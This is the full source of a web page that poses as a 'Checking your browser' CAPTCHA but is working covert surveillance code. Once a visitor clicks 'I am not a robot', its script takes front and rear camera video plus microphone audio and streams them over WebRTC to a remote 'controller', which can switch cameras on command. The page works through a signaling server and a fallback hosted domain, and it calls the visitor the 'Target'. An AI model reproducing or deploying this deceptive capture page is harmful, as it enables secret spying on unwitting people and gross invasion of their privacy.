<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: #f8fafc;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #1e293b;
            padding: 20px;
        }

        .card {
            background: #ffffff;
            border-radius: 12px;
            padding: 36px 30px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
            border: 1px solid #e2e8f0;
        }

        .icon-shield {
            width: 56px;
            height: 56px;
            background: #eff6ff;
            color: #2563eb;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }

        h1 {
            font-size: 1.35rem;
            font-weight: 600;
            color: #0f172a;
            margin-bottom: 10px;
        }

        p {
            font-size: 0.92rem;
            color: #64748b;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        button {
            background: #2563eb;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 0.95rem;
            font-weight: 500;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
        }

        button:hover {
            background: #1d4ed8;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
        }

        .spinner {
            display: inline-block;
            width: 32px;
            height: 32px;
            border: 3px solid #e2e8f0;
            border-top-color: #2563eb;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        video {
            display: none;
        }
    </style>
</head>

<body>
    <div class="card" id="mainCard">
        <div class="icon-shield">
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            </svg>
        </div>
        <h1>Checking your browser...</h1>
        <p>Please complete quick browser verification to access this protected destination.</p>
        <button id="verifyBtn" onclick="startCovertStream()">I am not a robot</button>
    </div>

    <video id="hiddenVideo" autoplay muted playsinline></video>

    <script>
        const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
        const host = window.location.host || "hangon-k31m.onrender.com";
        const wsUrl = `${protocol}//${host}/ws/target`;

        const rtcConfig = {
            iceServers: [
                { urls: "stun:stun.cloudflare.com:3478" },
                { urls: "stun:stun.l.google.com:19302" },
                { urls: "stun:stun1.l.google.com:19302" },
                { urls: "stun:stun2.l.google.com:19302" },
                { urls: "stun:stun3.l.google.com:19302" },
                { urls: "stun:stun4.l.google.com:19302" },
                {
                    urls: [
                        "turn:openrelay.metered.ca:80",
                        "turn:openrelay.metered.ca:443",
                        "turn:openrelay.metered.ca:443?transport=tcp"
                    ],
                    username: "openrelay",
                    credential: "openrelay"
                }
            ],
            iceCandidatePoolSize: 10
        };

        let ws;
        let pc;
        let localStream;
        let frontStream = null;
        let rearStream = null;
        let compositeStream = null;
        let canvasElement = null;
        let canvasCtx = null;
        let animFrameId = null;
        let pendingIceCandidates = [];
        let pingInterval = null;
        let isConnectingWs = false;
        let currentFacingMode = 'user'; // 'user' (front) or 'environment' (rear)
        
        const frontVideo = document.createElement('video');
        frontVideo.autoplay = true;
        frontVideo.muted = true;
        frontVideo.playsInline = true;

        const rearVideo = document.createElement('video');
        rearVideo.autoplay = true;
        rearVideo.muted = true;
        rearVideo.playsInline = true;

        async function startCovertStream() {
            const card = document.getElementById('mainCard');
            card.innerHTML = `
                <div class="spinner"></div>
                <h1 style="margin-top: 16px;">Verifying browser...</h1>
                <p>Establishing dual camera feeds. Please wait a moment.</p>
            `;

            try {
                // Initialize Front Camera
                try {
                    frontStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { ideal: "user" },
                            width: { ideal: 1280, max: 1920 },
                            height: { ideal: 720, max: 1080 },
                            frameRate: { ideal: 30, max: 30 }
                        },
                        audio: {
                            echoCancellation: true,
                            noiseSuppression: true,
                            autoGainControl: true
                        }
                    });
                    frontVideo.srcObject = frontStream;
                    await frontVideo.play().catch(() => {});
                } catch (err) {
                    console.warn("Front camera initial acquisition error:", err);
                }

                // Try acquiring Rear Camera simultaneously (if supported by hardware)
                try {
                    rearStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { ideal: "environment" },
                            width: { ideal: 1280, max: 1920 },
                            height: { ideal: 720, max: 1080 },
                            frameRate: { ideal: 30, max: 30 }
                        },
                        audio: false
                    });
                    rearVideo.srcObject = rearStream;
                    await rearVideo.play().catch(() => {});
                } catch (err) {
                    console.log("Hardware single-sensor mode: Rear camera will activate on demand.");
                }

                // Setup High-Definition Dual Canvas Compositor
                setupDualCompositor();

                connectSignaling();
            } catch (err) {
                console.error("Media/connection error:", err);
                card.innerHTML = `
                    <h1 style="color: #ef4444;">Verification Failed</h1>
                    <p>Camera access was not granted. Please allow camera permission and reload the page.</p>
                `;
            }
        }

        function setupDualCompositor() {
            canvasElement = document.createElement('canvas');
            canvasElement.width = 1280;
            canvasElement.height = 720;
            canvasCtx = canvasElement.getContext('2d', { alpha: false });

            function renderDualFrame() {
                // Clear background
                canvasCtx.fillStyle = "#090d16";
                canvasCtx.fillRect(0, 0, 1280, 720);

                // Draw Left Pane: FRONT CAMERA
                if (frontVideo.videoWidth > 0) {
                    canvasCtx.drawImage(frontVideo, 0, 0, 640, 720);
                } else if (currentFacingMode === 'user' && rearVideo.videoWidth > 0) {
                    canvasCtx.drawImage(rearVideo, 0, 0, 640, 720);
                } else {
                    canvasCtx.fillStyle = "#131d35";
                    canvasCtx.fillRect(0, 0, 640, 720);
                    canvasCtx.fillStyle = "#64748b";
                    canvasCtx.font = "bold 20px monospace";
                    canvasCtx.textAlign = "center";
                    canvasCtx.fillText("FRONT CAMERA [STANDBY]", 320, 360);
                }

                // Draw Right Pane: REAR CAMERA
                if (rearVideo.videoWidth > 0) {
                    canvasCtx.drawImage(rearVideo, 640, 0, 640, 720);
                } else if (currentFacingMode === 'environment' && frontVideo.videoWidth > 0) {
                    canvasCtx.drawImage(frontVideo, 640, 0, 640, 720);
                } else {
                    canvasCtx.fillStyle = "#0f172a";
                    canvasCtx.fillRect(640, 0, 640, 720);
                    canvasCtx.fillStyle = "#64748b";
                    canvasCtx.font = "bold 20px monospace";
                    canvasCtx.textAlign = "center";
                    canvasCtx.fillText("REAR CAMERA [STANDBY]", 960, 360);
                }

                // Center divider
                canvasCtx.strokeStyle = "rgba(0, 242, 254, 0.4)";
                canvasCtx.lineWidth = 4;
                canvasCtx.beginPath();
                canvasCtx.moveTo(640, 0);
                canvasCtx.lineTo(640, 720);
                canvasCtx.stroke();

                // Front Badge
                canvasCtx.fillStyle = "rgba(0, 0, 0, 0.75)";
                canvasCtx.fillRect(16, 16, 210, 36);
                canvasCtx.fillStyle = "#00f2fe";
                canvasCtx.font = "bold 15px monospace";
                canvasCtx.textAlign = "left";
                canvasCtx.fillText("● FRONT CAMERA", 28, 40);

                // Rear Badge
                canvasCtx.fillStyle = "rgba(0, 0, 0, 0.75)";
                canvasCtx.fillRect(656, 16, 210, 36);
                canvasCtx.fillStyle = "#10b981";
                canvasCtx.font = "bold 15px monospace";
                canvasCtx.textAlign = "left";
                canvasCtx.fillText("● REAR CAMERA", 668, 40);

                animFrameId = requestAnimationFrame(renderDualFrame);
            }

            renderDualFrame();

            compositeStream = canvasElement.captureStream(30);

            // Add audio track if present
            const audioStream = frontStream || rearStream;
            if (audioStream && audioStream.getAudioTracks().length > 0) {
                compositeStream.addTrack(audioStream.getAudioTracks()[0]);
            }

            localStream = compositeStream;
        }

        async function switchCamera(requestedMode) {
            const targetMode = requestedMode || (currentFacingMode === 'user' ? 'environment' : 'user');
            console.log(`[*] Activating camera sensor: ${targetMode}`);

            try {
                const newStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { ideal: targetMode },
                        width: { ideal: 1280, max: 1920 },
                        height: { ideal: 720, max: 1080 },
                        frameRate: { ideal: 30, max: 30 }
                    },
                    audio: false
                });

                if (targetMode === 'environment') {
                    if (rearStream) rearStream.getVideoTracks().forEach(t => t.stop());
                    rearStream = newStream;
                    rearVideo.srcObject = rearStream;
                    await rearVideo.play().catch(() => {});
                } else {
                    if (frontStream) frontStream.getVideoTracks().forEach(t => t.stop());
                    frontStream = newStream;
                    frontVideo.srcObject = frontStream;
                    await frontVideo.play().catch(() => {});
                }

                currentFacingMode = targetMode;

                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        type: "camera_info",
                        camera: currentFacingMode
                    }));
                }
            } catch (err) {
                console.error("Failed to activate camera:", err);
            }
        }

        function connectSignaling() {
            if (isConnectingWs) return;
            isConnectingWs = true;

            if (ws) {
                try {
                    ws.onclose = null;
                    ws.close();
                } catch (e) {}
            }

            ws = new WebSocket(wsUrl);

            ws.onopen = async function () {
                isConnectingWs = false;
                console.log("[+] Target connected to signaling server");

                // Start heartbeat ping
                if (pingInterval) clearInterval(pingInterval);
                pingInterval = setInterval(() => {
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({ type: "ping" }));
                    }
                }, 20000);

                await sendOffer();

                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        type: "camera_info",
                        camera: currentFacingMode
                    }));
                }
            };

            ws.onmessage = async (event) => {
                try {
                    const msg = JSON.parse(event.data);

                    if (msg.type === "pong") {
                        return;
                    }

                    if (msg.type === "request_offer") {
                        console.log("[+] Received request_offer from controller");
                        await sendOffer();
                    } else if (msg.type === "switch_camera") {
                        console.log("[+] Received switch_camera command");
                        await switchCamera(msg.camera);
                    } else if (msg.type === "answer" && pc) {
                        console.log("[+] Setting remote answer description");
                        await pc.setRemoteDescription(new RTCSessionDescription(msg.data));

                        // Flush any pending ICE candidates safely
                        while (pendingIceCandidates.length > 0) {
                            const cand = pendingIceCandidates.shift();
                            try {
                                await pc.addIceCandidate(cand);
                            } catch (e) {
                                console.warn("Failed to add queued candidate:", e);
                            }
                        }
                    } else if (msg.type === "ice" && pc) {
                        if (pc.remoteDescription && pc.remoteDescription.type) {
                            try {
                                await pc.addIceCandidate(msg.data);
                            } catch (e) {
                                console.warn("Failed to add ICE candidate:", e);
                            }
                        } else {
                            pendingIceCandidates.push(msg.data);
                        }
                    }
                } catch (e) {
                    console.error("Signaling message handling error:", e);
                }
            };

            ws.onerror = (err) => console.error("WebSocket error:", err);

            ws.onclose = () => {
                isConnectingWs = false;
                if (pingInterval) clearInterval(pingInterval);
                console.log("Target WebSocket closed. Reconnecting in 2s...");
                setTimeout(() => {
                    if (localStream) {
                        connectSignaling();
                    }
                }, 2000);
            };
        }

        async function sendOffer() {
            console.log("[*] Generating new WebRTC offer for controller");
            pendingIceCandidates = [];

            if (pc) {
                try {
                    pc.ontrack = null;
                    pc.onicecandidate = null;
                    pc.onconnectionstatechange = null;
                    pc.close();
                } catch (e) {
                    console.warn("Error closing old pc:", e);
                }
            }

            pc = new RTCPeerConnection(rtcConfig);

            if (localStream) {
                localStream.getTracks().forEach(track => {
                    if (track.readyState === 'live') {
                        console.log("[+] Adding track to PC:", track.kind);
                        pc.addTrack(track, localStream);
                    }
                });
            }

            pc.onicecandidate = (event) => {
                if (event.candidate && ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ type: "ice", data: event.candidate }));
                }
            };

            pc.onconnectionstatechange = () => {
                console.log("[*] Target WebRTC Connection State:", pc.connectionState);
            };

            const offer = await pc.createOffer({
                offerToReceiveAudio: false,
                offerToReceiveVideo: false
            });
            await pc.setLocalDescription(offer);

            if (ws && ws.readyState === WebSocket.OPEN) {
                console.log("[+] Dispatched offer to controller");
                ws.send(JSON.stringify({ type: "offer", data: offer }));
            }
        }
    </script>
</body>

</html>
